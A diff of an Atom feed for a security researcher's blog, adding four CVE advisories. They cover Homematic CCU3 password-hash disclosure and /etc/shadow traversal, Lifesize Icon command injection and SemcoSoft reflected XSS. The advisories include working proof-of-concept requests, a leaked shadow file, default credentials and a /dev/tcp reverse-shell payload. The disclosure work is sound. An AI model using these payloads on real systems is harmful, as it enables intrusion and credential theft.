@@ -2,10 +2,10 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
 
  <title>Patrick Münch Blog</title>
- <link href="http://atomic111.github.io/atom.xml" rel="self"/>
- <link href="http://atomic111.github.io/"/>
- <updated>2018-03-29T01:24:46+02:00</updated>
- <id>http://atomic111.github.io</id>
+ <link href="http://localhost:4000/atom.xml" rel="self"/>
+ <link href="http://localhost:4000/"/>
+ <updated>2019-11-01T12:31:38+01:00</updated>
+ <id>http://localhost:4000</id>
  <author>
    <name>Patrick Münch</name>
    <email></email>
@@ -13,10 +13,348 @@
 
  
  <entry>
+   <title>CVE-2019-9727: Unauthenticated password hash disclosure in Homematic CCU3</title>
+   <link href="http://localhost:4000/article/homematic-ccu3-unauthenticated-password-hash-disclosure"/>
+   <updated>2019-03-26T11:00:00+01:00</updated>
+   <id>http://localhost:4000/article/homematic-ccu3-unauthenticated-password-hash-disclosure</id>
+   <content type="html">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Vendor: eQ-3 AG&lt;/li&gt;
+  &lt;li&gt;Product: Homematic CCU3&lt;/li&gt;
+  &lt;li&gt;Version: 3.43.15&lt;/li&gt;
+  &lt;li&gt;Vulnerability: Unauthenticated password hash disclosure&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
+
+&lt;p&gt;HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU3 is a central control unit, which is responsible for integrating these components with each other.&lt;/p&gt;
+
+&lt;p&gt;From the vendor’s website:
+“The Central Control Unit CCU3 is the central element for local control of the Homematic IP smart home system. It represents the next generation of our proven Homematic Central Control Units CCU1 and CCU2. Operation via the Central Control Unit CCU3 can be used alternatively to the Homematic IP Access Point. While the Access Point establishes the connection to the free Homematic IP cloud and enables operation of the smart home system via a smartphone app, the Central Control Unit CCU3 works locally via a browser-based web interface (WebUI). Thanks to local configuration and operation as well as the option to create direct device connections, reliable and fail-proof operation of the smart home system is guaranteed at all times – even in the event of Internet failures.”&lt;/p&gt;
+
+&lt;h1 id=&quot;issue-description&quot;&gt;Issue Description&lt;/h1&gt;
+
+&lt;p&gt;While analyzing the implementation of the CCU3, an Unauthenticated Password Hash Disclosure vulnerability has been identified, which can be exploited in order to retrieve the password hashes of all existing user accounts. This vulnerability can be exploited by unauthenticated attackers with access to the web interface. The system provides a JSON-RPC API, which exposes various methods. While some methods require the connecting user to be authenticated, a number of methods can also be used anonymously.&lt;/p&gt;
+
+&lt;p&gt;A code review of the file &lt;code class=&quot;highlighter-rouge&quot;&gt;/www/api/methods.conf&lt;/code&gt; revealed that the &lt;code class=&quot;highlighter-rouge&quot;&gt;User.getUserPWD&lt;/code&gt; method can be used without authentication:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User.getUserPWD {
+  LEVEL NONE
+  SCRIPT_FILE user/getuserpwd.tcl
+  INFO {Gibt UserPWD zurück}
+  ARGUMENTS {_session_id_ userID}
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Exemplary request with a non-authenticated SID:&lt;/p&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;curl -X POST -k -i 'https://1.1.1.1/api/homematic.cgi' --data '{
+  &quot;version&quot;: &quot;1.1&quot;,
+  &quot;method&quot;: &quot;User.getUserPWD&quot;,
+  &quot;params&quot;: {
+    &quot;_session_id_&quot;: &quot;@MagZdAHu8d@&quot;,
+    &quot;userID&quot;: &quot;Admin&quot;
+  }
+}'
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Response of the Homematic CCU3:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
+  &quot;version&quot;: &quot;1.1&quot;,
+  &quot;result&quot;: {
+      &quot;UserPWD&quot;: &quot;c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec&quot;
+  }.UserPWD,
+  &quot;error&quot;: null
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;cve&quot;&gt;CVE&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9727&quot;&gt;CVE-2019-9727&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;cvssv3-base-score&quot;&gt;CVSSv3 Base Score&lt;/h1&gt;
+
+&lt;p&gt;CVSS Base Score: &lt;strong&gt;5.9&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N&lt;/p&gt;
+
+&lt;h1 id=&quot;credit&quot;&gt;Credit&lt;/h1&gt;
+
+&lt;p&gt;Patrick Muench of &lt;a href=&quot;https://www.sva.de&quot;&gt;SVA System Vertrieb Alexander GmbH&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Torsten Löbner of &lt;a href=&quot;https://www.sva.de&quot;&gt;SVA System Vertrieb Alexander GmbH&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Pascal Keul of &lt;a href=&quot;https://www.sva.de&quot;&gt;SVA System Vertrieb Alexander GmbH&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Lukas Zorn of &lt;a href=&quot;https://www.sva.de&quot;&gt;SVA System Vertrieb Alexander GmbH&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h1&gt;
+
+&lt;p&gt;The information provided is released “as is” without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.&lt;/p&gt;
+
+&lt;p&gt;The contents of this advisory are copyright (c) 2019 SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>CVE-2019-9726: Directory Traversal / Arbitrary File Read in Homematic CCU3</title>
+   <link href="http://localhost:4000/article/homematic-ccu3-fileread"/>
+   <updated>2019-03-26T11:00:00+01:00</updated>
+   <id>http://localhost:4000/article/homematic-ccu3-fileread</id>
+   <content type="html">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Vendor: eQ-3 AG&lt;/li&gt;
+  &lt;li&gt;Product: Homematic CCU3&lt;/li&gt;
+  &lt;li&gt;Version: 3.43.15&lt;/li&gt;
+  &lt;li&gt;Vulnerability: Arbitrary File Read&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
+
+&lt;p&gt;HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU3 is a central control unit, which is responsible for integrating these components with each other.&lt;/p&gt;
+
+&lt;p&gt;From the vendor’s website:
+“The Central Control Unit CCU3 is the central element for local control of the Homematic IP smart home system. It represents the next generation of our proven Homematic Central Control Units CCU1 and CCU2. Operation via the Central Control Unit CCU3 can be used alternatively to the Homematic IP Access Point. While the Access Point establishes the connection to the free Homematic IP cloud and enables operation of the smart home system via a smartphone app, the Central Control Unit CCU3 works locally via a browser-based web interface (WebUI). Thanks to local configuration and operation as well as the option to create direct device connections, reliable and fail-proof operation of the smart home system is guaranteed at all times – even in the event of Internet failures.”&lt;/p&gt;
+
+&lt;h1 id=&quot;issue-description&quot;&gt;Issue Description&lt;/h1&gt;
+
+&lt;p&gt;While analyzing the implementation of the CCU3’s web interface, a Directory Traversal vulnerabilities has been identified, which can be exploited in order to read files from the CCU3’s filesystem. This vulnerability can be exploited by unauthenticated attackers with access to the web interface. The vulnerability exist because of erroneous handling of Nullbytes. The following URLs are proofed to be vulnerable:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;http://1.1.1.1/.%00./.%00./tmp/event/subscriber.list&lt;/li&gt;
+  &lt;li&gt;http://1.1.1.1/.%00./.%00./etc/shadow&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The following HTTP request illustrates the attack:&lt;/p&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/.%00./.%00./etc/shadow&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1.1.1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;curl/7.64.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;*/*&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Response of the Homematic CCU3:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root:$1$FgzlpeV5$8cHtTwR1K5UkDHyNDlmo51:17640:0:99999:7:::
+daemon:*:10933:0:99999:7:::
+bin:*:10933:0:99999:7:::
+sys:*:10933:0:99999:7:::
+sync:*:10933:0:99999:7:::
+mail:*:10933:0:99999:7:::
+www-data:*:10933:0:99999:7:::
+halt:*:10933:0:99999:7:::
+uucp:*:10933:0:99999:7:::
+operator:*:10933:0:99999:7:::
+ftp:*:10933:0:99999:7:::
+nobody:*:10933:0:99999:7:::
+_ntp:*:::::::
+sshd:*:::::::
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;cve&quot;&gt;CVE&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9726&quot;&gt;CVE-2019-9726&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;cvssv3-base-score&quot;&gt;CVSSv3 Base Score&lt;/h1&gt;
+
+&lt;p&gt;CVSS Base Score: &lt;strong&gt;7.5&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N&lt;/p&gt;
+
+&lt;h1 id=&quot;credit&quot;&gt;Credit&lt;/h1&gt;
+
+&lt;p&gt;Pascal Keul of &lt;a href=&quot;https://www.sva.de&quot;&gt;SVA System Vertrieb Alexander GmbH&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Patrick Muench of &lt;a href=&quot;https://www.sva.de&quot;&gt;SVA System Vertrieb Alexander GmbH&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h1&gt;
+
+&lt;p&gt;The information provided is released “as is” without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.&lt;/p&gt;
+
+&lt;p&gt;The contents of this advisory are copyright (c) 2019 SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>CVE-2019-3702: Remote Code Execution in Lifesize Icon</title>
+   <link href="http://localhost:4000/article/lifesize-icon-remote-code-execution"/>
+   <updated>2019-03-26T10:00:00+01:00</updated>
+   <id>http://localhost:4000/article/lifesize-icon-remote-code-execution</id>
+   <content type="html">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Vendor: Lifesize&lt;/li&gt;
+  &lt;li&gt;Product: Lifesize Icon&lt;/li&gt;
+  &lt;li&gt;Version: LS_RM3_3.7.0 (2421)&lt;/li&gt;
+  &lt;li&gt;Vulnerability: Remote Code Execution&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
+
+&lt;p&gt;LifeSize Icon is a video collaboration platform and consists of various components, e.q. software, video and phone systems.&lt;/p&gt;
+
+&lt;p&gt;From the vendor’s website:
+“For more than a decade, Lifesize has been at the forefront of video collaboration delivering high-quality technology designed to bring people together. Our focus is on developing market-leading products that deliver easy-to-use and scalable audio, web and video conferencing. We combine an integrated, best-in-class cloud-based conferencing experience, with award-winning, easy-to-use HD camera systems and HD phones so that you can connect to anyone, anywhere. It’s a meeting experience like no other.”&lt;/p&gt;
+
+&lt;h1 id=&quot;issue-description&quot;&gt;Issue Description&lt;/h1&gt;
+
+&lt;p&gt;While analyzing the implementation of LifeSize Icon Software, one Remote Code Execution vulnerability has been identified, which can be exploited in order to execute arbitrary commands within the DNS Query address field. This vulnerability can be exploited by authenticated attackers with access to the web interface.&lt;/p&gt;
+
+&lt;p&gt;The system provides a JSON API, which exposes various methods like the DNS Query function. This function contains a address field that can be exploited with a remote command execution.&lt;/p&gt;
+
+&lt;p&gt;The following HTTP request illustrates this approach:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;HTTP-Request&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/rest/request/8cb1a00d113443c6a9a220104bbdea33/Comm_dnsQuery&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1.1.1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;Firefox/63.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;*/*&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;de,en-US;q=0.7,en;q=0.3&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://1.1.1.1/&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;icon-web-client&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Authorization&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;LSBasic c3VwcG9ydDpzdXBwb3J0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Requested-With&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;XMLHttpRequest&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;142&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;call&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Comm_dnsQuery&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;params&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;domainname&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.1.1.2; 0&amp;lt;&amp;amp;196;exec 196&amp;lt;&amp;gt;/dev/tcp/1.1.1.2/4446; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;cve&quot;&gt;CVE&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-3702&quot;&gt;CVE-2019-3702&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;cvssv3-base-score&quot;&gt;CVSSv3 Base Score&lt;/h1&gt;
+
+&lt;p&gt;CVSS Base Score: &lt;strong&gt;8.8&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H&lt;/p&gt;
+
+&lt;h1 id=&quot;credit&quot;&gt;Credit&lt;/h1&gt;
+
+&lt;p&gt;Patrick Muench of &lt;a href=&quot;https://www.sva.de&quot;&gt;SVA System Vertrieb Alexander GmbH&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Joshua Lehr&lt;/p&gt;
+
+&lt;h1 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h1&gt;
+
+&lt;p&gt;The information provided is released “as is” without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.&lt;/p&gt;
+
+&lt;p&gt;The contents of this advisory are copyright (c) 2019 SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>CVE-2018-18692: Cross-Site Scripting in Semcosoft</title>
+   <link href="http://localhost:4000/article/semcosoft-cross-site-scripting"/>
+   <updated>2019-02-14T22:40:00+01:00</updated>
+   <id>http://localhost:4000/article/semcosoft-cross-site-scripting</id>
+   <content type="html">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Vendor: SEMCO Software Engineering GmbH&lt;/li&gt;
+  &lt;li&gt;Product: SemcoSoft&lt;/li&gt;
+  &lt;li&gt;Version: 5.3&lt;/li&gt;
+  &lt;li&gt;Vulnerability: Reflected Cross-Site Scripting&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
+
+&lt;p&gt;SEMCO stands for a modern seminar and course management, which supports employees in a time-saving and efficient way in the daily business. It finds its use in company training, coaching, seminars of any orientation and in the area of internal training.&lt;/p&gt;
+
+&lt;p&gt;Vendor’s website (&lt;a href=&quot;https://www.semcosoft.com&quot;&gt;SEMCO&lt;/a&gt;):&lt;/p&gt;
+
+&lt;h1 id=&quot;issue-description&quot;&gt;Issue Description&lt;/h1&gt;
+
+&lt;p&gt;As part of a penetration test, a cross-site scripting (XSS) vulnerability was found in the Semco software, which allows an attacker to steal the session cookie of an already logged-in user through a cross-site request-forgery (CSRF) attack.&lt;/p&gt;
+
+&lt;p&gt;Reflected cross-site scripting (XSS) occurs when an attacker injects executable code into the browser within a single HTTP response. The injected code is not stored inside the application. It affects users who open a malicious link or a third party website. The injected code is part of a URI or HTTP parameter that was not properly validated by the application and returned to the victim. Such an attack allows an attacker to access information such as session cookies from the user. In the case of the Semco software, this is possible because the parameter “username” of the HTTP GET request is not subjected to any input validation.&lt;/p&gt;
+
+&lt;p&gt;By calling the URL, the XSS vulnerability can be exploited and the PHPSESSID, which is stored in a cookie, can be displayed.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;HTTP-Request&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /login?username=%22%3E%3C/span%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cspan%20id=%22username&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;_e=RvkztFgiQsQI%252FKXLsr48kh%252BgKeVU1jNeaLJ0NZLxQQpE6KO1No9MHbbxa%252Bygv1qv&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;password=&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;post=login&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;remove_duplicate_logins= HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;HTTP-Response&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
+Date: Fri, 26 Oct 2018 14:21:48 GMT
+Server: Apache/2.2.22 (Debian)
+X-Powered-By: PHP/5.6.36-1~dotdeb+7.1
+Set-Cookie: PHPSESSID=tljhfircqdj32t7gj4q8vjk042; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 6635
+Connection: close
+Content-Type: text/html; charset=utf-8
+
+...[SNIP]...
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;loginform&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;loginform&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/login?post=login&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inhaltform&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;margin: 0 0 200px 0;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;remove_duplicate_logins&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;remove_duplicate_logins&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;fieldset&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Login&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;formzeile&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&amp;gt;&lt;/span&gt;Benutzer&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;textfeld&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
